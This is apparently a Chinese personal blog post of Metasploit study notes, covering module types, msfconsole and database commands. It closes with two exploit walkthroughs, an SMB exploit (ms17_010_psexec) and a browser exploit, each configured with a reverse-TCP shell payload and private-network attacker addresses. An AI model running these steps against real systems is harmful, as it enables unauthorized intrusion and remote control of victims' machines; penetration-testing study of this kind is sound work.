@@ -1,0 +1,171 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="wjc"><meta name="copyright" content="wjc"><meta name="generator" content="Hexo 5.4.0"><meta name="theme" content="hexo-theme-yun"><title>MSF学习 | 古古怪怪</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.25/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_dxory92pb0h.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>document.addEventListener("DOMContentLoaded", () => {
+  [".post-card",".post-content img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+});
+</script><link rel="icon" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="alternate icon" href="/yun.ico"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
+    const Yun = window.Yun || {};
+    window.CONFIG = {"hostname":"ggggwjc.github.io.git","root":"/","title":"古古怪怪的博客","version":"1.6.2","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><meta name="description" content="MSF架构——技术功能模块MSF默认存放模块的目录如下 1&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;  MSF有6个模块，分别对上面目录下的6个子文件夹： auxiliary负责执行信息收集、扫描、嗅探、指纹识别、口令猜测和Dos攻击等功能的辅助模块 exploits利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法（主动、被动）  payload">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MSF学习">
+<meta property="og:url" content="https://ggggwjc.github.io.git/2021/08/27/MSF%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="古古怪怪">
+<meta property="og:description" content="MSF架构——技术功能模块MSF默认存放模块的目录如下 1&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;  MSF有6个模块，分别对上面目录下的6个子文件夹： auxiliary负责执行信息收集、扫描、嗅探、指纹识别、口令猜测和Dos攻击等功能的辅助模块 exploits利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法（主动、被动）  payload">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-08-27T07:36:25.000Z">
+<meta property="article:modified_time" content="2021-08-27T08:02:53.975Z">
+<meta property="article:author" content="wjc">
+<meta property="article:tag" content="工具">
+<meta name="twitter:card" content="summary"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="wjc"><img width="96" loading="lazy" src="/%E5%A4%B4%E5%83%8F.png" alt="wjc"><span class="site-author-status" title="永远相信美好的事情即将发生">😊</span></a><div class="site-author-name"><a href="/about/">wjc</a></div><span class="site-name">古古怪怪</span><sub class="site-subtitle"></sub><div class="site-desciption">时间磨平了菱角</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">6</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">3</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">3</span></a></div><a class="site-state-item hty-icon-button" href="/about/#comment" title="留言板"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-clipboard-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/ggggwjc" title="GitHub" target="_blank" style="color:#6e5494"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=1793940114" title="网易云音乐" target="_blank" style="color:#C20C0C"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-netease-cloud-music-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF%E6%9E%B6%E6%9E%84%E2%80%94%E2%80%94%E6%8A%80%E6%9C%AF%E5%8A%9F%E8%83%BD%E6%A8%A1%E5%9D%97"><span class="toc-number">1.</span> <span class="toc-text">MSF架构——技术功能模块</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#auxiliary"><span class="toc-number">1.1.</span> <span class="toc-text">auxiliary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exploits"><span class="toc-number">1.2.</span> <span class="toc-text">exploits</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payloads"><span class="toc-number">1.3.</span> <span class="toc-text">payloads</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#encoders"><span class="toc-number">1.4.</span> <span class="toc-text">encoders</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nops"><span class="toc-number">1.5.</span> <span class="toc-text">nops</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#post"><span class="toc-number">1.6.</span> <span class="toc-text">post</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">基本使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kali%E4%B8%AD%E6%9B%B4%E6%96%B0MSF"><span class="toc-number">2.1.</span> <span class="toc-text">Kali中更新MSF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msfconsole"><span class="toc-number">2.2.</span> <span class="toc-text">msfconsole</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#connect"><span class="toc-number">2.3.</span> <span class="toc-text">connect</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#show"><span class="toc-number">2.4.</span> <span class="toc-text">show</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#search"><span class="toc-number">2.5.</span> <span class="toc-text">search</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#info"><span class="toc-number">2.6.</span> <span class="toc-text">info</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#use"><span class="toc-number">2.7.</span> <span class="toc-text">use</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#set-setg"><span class="toc-number">2.8.</span> <span class="toc-text">set&#x2F;setg</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unset-unsetg"><span class="toc-number">2.9.</span> <span class="toc-text">unset&#x2F;unsetg</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#check"><span class="toc-number">2.10.</span> <span class="toc-text">check</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#back"><span class="toc-number">2.11.</span> <span class="toc-text">back</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#run%E6%88%96exploit"><span class="toc-number">2.12.</span> <span class="toc-text">run或exploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sessions"><span class="toc-number">2.13.</span> <span class="toc-text">sessions</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#load-unload"><span class="toc-number">2.14.</span> <span class="toc-text">load&#x2F;unload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msf%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3"><span class="toc-number">3.</span> <span class="toc-text">msf数据库相关</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#db-status%EF%BC%9A"><span class="toc-number">3.1.</span> <span class="toc-text">db_status：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#db-rebuild-cache%EF%BC%9A"><span class="toc-number">3.2.</span> <span class="toc-text">db_rebuild_cache：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#db-disconnect%EF%BC%9A"><span class="toc-number">3.3.</span> <span class="toc-text">db_disconnect：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#db-connect%EF%BC%9A"><span class="toc-number">3.4.</span> <span class="toc-text">db_connect：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#db-nmap%EF%BC%9A"><span class="toc-number">3.5.</span> <span class="toc-text">db_nmap：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#creds%EF%BC%9A"><span class="toc-number">3.6.</span> <span class="toc-text">creds：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#vulns%EF%BC%9A"><span class="toc-number">3.7.</span> <span class="toc-text">vulns：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#loot%EF%BC%9A"><span class="toc-number">3.8.</span> <span class="toc-text">loot：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#db-export-db-import%EF%BC%9A"><span class="toc-number">3.9.</span> <span class="toc-text">db_export&#x2F;db_import：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit%E6%A8%A1%E5%9D%97"><span class="toc-number">4.</span> <span class="toc-text">Exploit模块</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Active-Exploit"><span class="toc-number">4.1.</span> <span class="toc-text">Active Exploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Passive-Exploit"><span class="toc-number">4.2.</span> <span class="toc-text">Passive Exploit</span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="https://ggggwjc.github.io.git/2021/08/27/MSF%E5%AD%A6%E4%B9%A0/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="wjc"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="古古怪怪"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">MSF学习</h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="创建时间：2021-08-27 15:36:25" itemprop="dateCreated datePublished" datetime="2021-08-27T15:36:25+08:00">2021-08-27</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">学习笔记</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/%E5%B7%A5%E5%85%B7/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">工具</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0078E7;"><h2 id="MSF架构——技术功能模块"><a href="#MSF架构——技术功能模块" class="headerlink" title="MSF架构——技术功能模块"></a>MSF架构——技术功能模块</h2><p>MSF默认存放模块的目录如下</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/modules/</span><br></pre></td></tr></table></figure>
+
+<p>MSF有6个模块，分别对上面目录下的6个子文件夹：</p>
+<h3 id="auxiliary"><a href="#auxiliary" class="headerlink" title="auxiliary"></a>auxiliary</h3><p>负责执行信息收集、扫描、嗅探、指纹识别、口令猜测和Dos攻击等功能的辅助模块</p>
+<h3 id="exploits"><a href="#exploits" class="headerlink" title="exploits"></a>exploits</h3><p>利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法（主动、被动） </p>
+<h3 id="payloads"><a href="#payloads" class="headerlink" title="payloads"></a>payloads</h3><p>成功exploit之后，真正在目标系统执行的代码或指令。分为3种类型的payload，分别是single、stages和stagers。shellcode是特殊的payload，用于拿shell。</p>
+<ul>
+<li>single：all-in-one。完整的payload，这些payload都是一体化的，不需要依赖外部的库和包。</li>
+<li>stagers：目标计算机内存有限时，先传输一个较小的payload用于建立连接</li>
+<li>stages：利用stagers建立的连接下载后续payload </li>
+</ul>
+<h3 id="encoders"><a href="#encoders" class="headerlink" title="encoders"></a>encoders</h3><p>对payload进行加密，躲避AntiVirus检查的模块</p>
+<h3 id="nops"><a href="#nops" class="headerlink" title="nops"></a>nops</h3><p>提高payload稳定性及维持大小。在渗透攻击构造恶意数据缓冲区时，常常要在真正要执行的Shellcode之前添加一段空指令区， 这样当触发渗透攻击后跳转执行ShellCode时，有一个较大的安全着陆区，从而避免受到内存 地址随机化、返回地址计算偏差等原因造成的ShellCode执行失败，提高渗透攻击的可靠性。</p>
+<h3 id="post"><a href="#post" class="headerlink" title="post"></a>post</h3><p>后期渗透模块。在取得目标系统远程控制权后，进行一系列的后渗透攻击动作，如获取敏感信息、跳板攻击等操作 </p>
+<h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><h3 id="Kali中更新MSF"><a href="#Kali中更新MSF" class="headerlink" title="Kali中更新MSF"></a>Kali中更新MSF</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt install metasploit-framework</span><br></pre></td></tr></table></figure>
+
+<h3 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole"></a>msfconsole</h3><p>控制台命令支持TAB补全，支持外部命令的执行（系统命令）</p>
+<p>help或?</p>
+<p>显示msfconsole可以使用的命令。help ，显示某一命令的用法。</p>
+<h3 id="connect"><a href="#connect" class="headerlink" title="connect"></a>connect</h3><p>可以理解成MSF中的nc命令，可以使用connect -h查看详细用法。</p>
+<p>connect [options]</p>
+<h3 id="show"><a href="#show" class="headerlink" title="show"></a>show</h3><ul>
+<li>用show命令查看msf提供的资源。在根目录下执行的话，由于有些模块资源比较多，需要执行show命令要较长的时间</li>
+<li>show exploits：查看可以使用的exploit</li>
+<li>除了exploits，还支持all, encoders, nops, exploits, payloads, auxiliary, post, plugins, info, options。有些选项需要用use使用一个模块后才能使用，比如给show targets。</li>
+</ul>
+<h3 id="search"><a href="#search" class="headerlink" title="search"></a>search</h3><ul>
+<li>搜索模块</li>
+<li>简单搜索：seach ms17_010</li>
+<li>多条件搜索缩小范围：search name:mysql type:exploit platform:linux</li>
+</ul>
+<h3 id="info"><a href="#info" class="headerlink" title="info"></a>info</h3><ul>
+<li>查看模块的信息</li>
+<li>info </li>
+<li>如果用use使用了一个模块，直接输入info即可查看</li>
+</ul>
+<h3 id="use"><a href="#use" class="headerlink" title="use"></a>use</h3><ul>
+<li>search找到模块后，用use使用模块</li>
+<li>use exploit/windows/smb/ms08_067_netapi</li>
+<li>用use使用一个模块后，可以使用 show options查看我们需要配置的选项、使用show targets选择目标主机系统、使用show payloads选择payload、使用show advanced查看高级参数、使用show evasion查看用来做混淆、逃避的模块。</li>
+</ul>
+<h3 id="set-setg"><a href="#set-setg" class="headerlink" title="set/setg"></a>set/setg</h3><ul>
+<li>设置参数，比如要渗透的主机IP、payload等。我们可以用show missing查看没有设置的参数</li>
+</ul>
+<h3 id="unset-unsetg"><a href="#unset-unsetg" class="headerlink" title="unset/unsetg"></a>unset/unsetg</h3><ul>
+<li>取消设置参数。unsetg是取消设置的全局变量</li>
+</ul>
+<p>save</p>
+<ul>
+<li>设置的参数在下一次启动的时候不会生效，可以用save保存我们使用过程的设置。</li>
+</ul>
+<h3 id="check"><a href="#check" class="headerlink" title="check"></a>check</h3><ul>
+<li>检查目标是否真的存在这个漏洞，大部分模块没有check功能</li>
+</ul>
+<h3 id="back"><a href="#back" class="headerlink" title="back"></a>back</h3><ul>
+<li>回到msfconsole根目录</li>
+</ul>
+<h3 id="run或exploit"><a href="#run或exploit" class="headerlink" title="run或exploit"></a>run或exploit</h3><ul>
+<li>开始使用模块</li>
+<li>exploit -j：以后台的方式运行</li>
+</ul>
+<h3 id="sessions"><a href="#sessions" class="headerlink" title="sessions"></a>sessions</h3><ul>
+<li>查看当前已经建立的sessions，说明已经拿到了shell</li>
+<li>sessions -i id 可以进入一个session交互</li>
+</ul>
+<h3 id="load-unload"><a href="#load-unload" class="headerlink" title="load/unload"></a>load/unload</h3><ul>
+<li><p>调用外部的扫描命令，比如openvas</p>
+</li>
+<li><p>loadpath</p>
+<p>：</p>
+<ul>
+<li>加载自己的模块 </li>
+</ul>
+</li>
+<li><p>route</p>
+<p>：</p>
+<ul>
+<li>添加一条路由。比如发往某个子网的流量都通过攻陷的机器发送。</li>
+</ul>
+</li>
+</ul>
+<h2 id="msf数据库相关"><a href="#msf数据库相关" class="headerlink" title="msf数据库相关"></a>msf数据库相关</h2><h3 id="db-status："><a href="#db-status：" class="headerlink" title="db_status："></a><strong>db_status</strong>：</h3><ul>
+<li>查看MSF有没有连接上后台数据库。如果没有连上数据库，在终端输入msfdb start后再启动MSF。没有连接上数据库MSF也是可以使用的，只是连接上了的话，我们渗透过程中获取的一些信息可以保存下来，比如目标机器的账号密码信息等。</li>
+</ul>
+<h3 id="db-rebuild-cache："><a href="#db-rebuild-cache：" class="headerlink" title="db_rebuild_cache："></a><strong>db_rebuild_cache</strong>：</h3><ul>
+<li>这个命令将所有模块信息缓存到数据库中，通过数据库检索效率就高很多了。</li>
+</ul>
+<h3 id="db-disconnect："><a href="#db-disconnect：" class="headerlink" title="db_disconnect："></a><strong>db_disconnect</strong>：</h3><ul>
+<li>断开数据库连接。</li>
+</ul>
+<h3 id="db-connect："><a href="#db-connect：" class="headerlink" title="db_connect："></a><strong>db_connect</strong>：</h3><ul>
+<li>msf默认连上postgresql的msf数据库。可以用db_connect连接我们指定的数据库。如果要使用配置文件进行连接，默认的数据库配置文件为/usr/share/metasploit-framework/config/database.yml，可以参考这个文件进行编写。</li>
+</ul>
+<h3 id="db-nmap："><a href="#db-nmap：" class="headerlink" title="db_nmap："></a><strong>db_nmap</strong>：</h3><ul>
+<li>集成在msf中的namp扫描命令。不同的是db_nmap扫描的结果会自动保存到数据库中。</li>
+<li>可以输入hosts查看扫描到的主机信息</li>
+<li>如果数据多，可以用 hosts IP 进行过滤；hosts -u 查看up状态的机器；使用 hosts -c 列名[,列名] 指定要看的列；使用 hosts -S 进行搜索，比如hosts -S windows。</li>
+<li>输入services可以查看主机开放的端口情况</li>
+</ul>
+<h3 id="creds："><a href="#creds：" class="headerlink" title="creds："></a><strong>creds：</strong></h3><ul>
+<li>查看扫描出来的密码信息</li>
+</ul>
+<h3 id="vulns："><a href="#vulns：" class="headerlink" title="vulns："></a><strong>vulns：</strong></h3><ul>
+<li>查看扫描出来的漏洞信息</li>
+</ul>
+<h3 id="loot："><a href="#loot：" class="headerlink" title="loot："></a><strong>loot</strong>：</h3><ul>
+<li>有些账号密码我们可能没有获取到明文信息，可是经过加密的hash值，可以用这个显示</li>
+</ul>
+<h3 id="db-export-db-import："><a href="#db-export-db-import：" class="headerlink" title="db_export/db_import："></a><strong>db_export/db_import</strong>：</h3><ul>
+<li>数据库的导入和导出</li>
+<li>db_export -f /root/msfbak.xml</li>
+<li>nmap导出的也可以导入到msf中</li>
+<li>nmap -A 192.168.1.113 -oX nmap.xml =&gt; db_import -f /root/nmap.xml</li>
+</ul>
+<h2 id="Exploit模块"><a href="#Exploit模块" class="headerlink" title="Exploit模块"></a>Exploit模块</h2><p>分为Active Exploit和Passive Exploit</p>
+<h3 id="Active-Exploit"><a href="#Active-Exploit" class="headerlink" title="Active Exploit"></a><strong>Active Exploit</strong></h3><p>目标提供了某种服务，服务存在漏洞</p>
+<ul>
+<li>use exploit/windows/smb/ms17_010_psexec</li>
+<li>set RHOST 192.168.1.100</li>
+<li>set PAYLOAD windows/shell/reverse_tcp</li>
+<li>set LHOST 192.168.1.1</li>
+<li>set LPORT 4444</li>
+<li>set SMBUSER user1</li>
+<li>set SMBPASS pass1</li>
+<li>exploit</li>
+</ul>
+<h3 id="Passive-Exploit"><a href="#Passive-Exploit" class="headerlink" title="Passive Exploit"></a><strong>Passive Exploit</strong></h3><p>被攻击者通常不开放端口或开放端口上的服务没有漏洞，漏洞存在于受害者机器上的客户端软件上。客户端需要访问某些远程服务器上的服务，当它访问的时候，当在服务器上放置了漏洞利用代码，由于客户端程序存在漏洞，服务器也会将这些漏洞利用代码作为响应报文返回给客户端，造成客户端漏洞被利用。</p>
+<ul>
+<li>use exploit/windows/browser/ms07_017_ani_loadimage_chunksize</li>
+<li>set URIPATH /</li>
+<li>set PAYLOAD windows/shell/reverse_tcp</li>
+<li>set LHOST 192.168.1.1</li>
+<li>set PORT 4444</li>
+<li>exploit </li>
+</ul>
+</div><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-hand-coin-line"></use></svg></span><div id="reward-comment">我很可爱，请给我钱</div><div id="qr" style="display:none;"><div style="display:inline-block"><a href="微信.png"><img loading="lazy" src="/%E5%BE%AE%E4%BF%A1.png" alt="微信支付" title="微信支付"></a><div><span style="color:#2DC100"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-wechat-pay-line"></use></svg></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>wjc</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://ggggwjc.github.io.git/2021/08/27/MSF%E5%AD%A6%E4%B9%A0/" title="MSF学习">https://ggggwjc.github.io.git/2021/08/27/MSF%E5%AD%A6%E4%B9%A0/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> 许可协议。</li></ul></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2021/09/01/74cms6.0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="prev" title="74cms6.0文件包含漏洞复现"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-left-s-line"></use></svg><span class="post-nav-text">74cms6.0文件包含漏洞复现</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2021/08/27/ATT&amp;CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97-%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%981%E5%86%85%E7%BD%91/" rel="next" title="ATT&amp;CK实战系列-红队实战1内网"><span class="post-nav-text">ATT&amp;CK实战系列-红队实战1内网</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>要不要和我说些什么？</span><br></div></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2021 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> wjc</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v5.4.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.6.2</span></div><div class="live_time"><span>本博客已萌萌哒地运行</span><span id="display_live_time"></span><span class="moe-text">(●'◡'●)</span><script>function blog_live_time() {
+  setTimeout(blog_live_time, 1000);
+  const start = new Date('2021-08-16T00:00:00');
+  const now = new Date();
+  const timeDiff = (now.getTime() - start.getTime());
+  const msPerMinute = 60 * 1000;
+  const msPerHour = 60 * msPerMinute;
+  const msPerDay = 24 * msPerHour;
+  const passDay = Math.floor(timeDiff / msPerDay);
+  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
+  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
+  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
+  display_live_time.innerHTML = " " + passDay + " 天 " + passHour + " 小时 " + passMinute + " 分 " + passSecond + " 秒";
+}
+blog_live_time();
+</script></div></footer><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a></div></body></html>
